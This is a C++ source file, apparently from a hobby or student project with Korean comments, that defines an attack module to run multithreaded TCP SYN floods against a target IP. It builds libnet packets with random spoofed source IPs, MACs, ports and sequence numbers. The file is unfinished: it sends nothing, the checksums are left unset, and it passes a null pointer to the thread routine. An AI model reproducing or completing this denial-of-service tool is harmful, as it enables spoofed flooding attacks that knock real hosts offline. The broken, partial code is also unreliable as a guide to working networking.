#include "../lib/atkmod.h"

ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    this->tip = tip;
    this->type = type;
    this->speed = speed;
    this->dur = dur;
}

void ATTACKMODULE::attack(){
    pthread_t AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        pthread_create(&AttackThreads[i], NULL, attack_routine, NULL);
    }
    
    for(int i = 0; i < THREADS; i++){
        pthread_join(AttackThreads[i], NULL);
    }
}

// TODO:make attack_routine function
void* attack_routine(void* arg){


    // TCP SYN ATTACK 작성중...
    ATTACKMODULE* module = (ATTACKMODULE*)arg;
    
    // packet for TCP SYN ATTACK
    PKT<ETHIPTCP> packet(module->dev);

    // 시드생성
    libnet_seed_prand(NULL);

    // setting packet

    // 이더넷 헤더
    /*
    타겟이 내부 네트워크면
    ARP 리퀘스트를 해서 맥을 받아와야 하고
    타겟이 외부 네트워크면
    그냥 게이트웨이 맥을 넣어줘야 할 것 같아요.

    packet.pkt.eth_hdr.ether_dhost = target mac;
    // random source mac
    packet.pkt.eth_hdr.ether_shost[0] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[1] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[2] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[3] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[4] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[5] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_type = htons(ETHERTYPE_IP);
    */

    // IP 헤더
    packet.pkt.ip_hdr.ip_v = 4 << 4;                           // version
    packet.pkt.ip_hdr.ip_hl = 5;                               // header length
    packet.pkt.ip_hdr.ip_tos = IPTOS_CLASS_CS0;                // 뭔지 모르겠음
    //packet.pkt.ip_hdr.ip_len = htons();                        // total length
    packet.pkt.ip_hdr.ip_id = libnet_get_prand(LIBNET_PRu16);  // random ID
    packet.pkt.ip_hdr.ip_off = IP_DF;                          // don't fragment
    packet.pkt.ip_hdr.ip_ttl = libnet_get_prand(LIBNET_PR8);   // random TTL
    packet.pkt.ip_hdr.ip_p = IPPROTO_TCP;                      // protocol = TCP
    //packet.pkt.ip_hdr.ip_sum = htons();                        // 체크섬, 모르겠음
    packet.pkt.ip_hdr.ip_src.s_addr = libnet_get_prand(LIBNET_PRu32);  // random source IP
    packet.pkt.ip_hdr.ip_dst.s_addr = inet_addr(module->tip.c_str());  // target IP
    
    // TCP 헤더
    packet.pkt.tcp_hdr.th_sport = libnet_get_prand(LIBNET_PRu16);  // random source port
    packet.pkt.tcp_hdr.th_dport = libnet_get_prand(LIBNET_PRu16);  // random destination port
    packet.pkt.tcp_hdr.th_seq = libnet_get_prand(LIBNET_PRu32);    // random seq number
    packet.pkt.tcp_hdr.th_ack = 0;                                 // SYN이니까 ack num은 0
    packet.pkt.tcp_hdr.th_off = 5 << 4;                            // header length
    packet.pkt.tcp_hdr.th_flags = TH_SYN;                          // flag = SYN!!
    packet.pkt.tcp_hdr.th_win = libnet_get_prand(LIBNET_PRu16);    // random window size
    //packet.pkt.tcp_hdr.th_sum = htons();                           // 체크섬, 모르겠음
    packet.pkt.tcp_hdr.th_urp = 0;                                 // urgent pointer, 모르겠음


    return NULL;
}